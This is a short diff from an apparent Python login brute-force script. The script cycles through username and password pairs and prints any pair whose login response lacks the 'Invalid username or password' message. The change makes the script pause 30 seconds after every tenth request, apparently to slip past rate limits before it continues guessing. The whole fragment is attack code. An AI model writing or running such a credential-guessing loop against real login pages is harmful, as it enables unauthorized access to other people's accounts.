@@ -24,7 +24,7 @@ try:
 		if "Invalid username or password" not in response.text:
 			print(f"Found: {users[index]} {pwd[index]}")
 			break
-		elif max_req == 10:
+		elif max_req % 10 == 0:
 			print("Sleep")
 			time.sleep(30)
 			print("Continue brute")
